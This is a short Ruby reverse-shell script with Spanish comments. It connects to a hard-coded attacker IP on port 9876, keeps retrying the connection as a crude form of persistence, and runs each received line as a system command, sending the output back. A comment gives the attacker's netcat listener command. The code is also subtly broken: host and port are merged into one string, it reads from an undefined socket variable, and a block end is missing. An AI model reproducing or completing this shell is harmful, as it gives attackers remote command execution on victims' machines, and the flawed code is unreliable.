#!/usr/bin/env ruby
require 'socket'
require 'open3'
RHOST="192.168.1.78"
RPORT="9876"
=begin

# RHOST = "IP Atacante"
# atacante ejecuta netcat-openbsd en el puerto 9876
  >_   nc -lvp 9876

=end

# persistencia
begin
  S = TCPSocket.new "#{RHOST}, #{RPORT}"
  S.puts "conectado"
rescue
  sleep 20
  retry
end

# ejecutar comandos
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
      IO.copy_stream(stdout_and_stderr, S)
  end
end

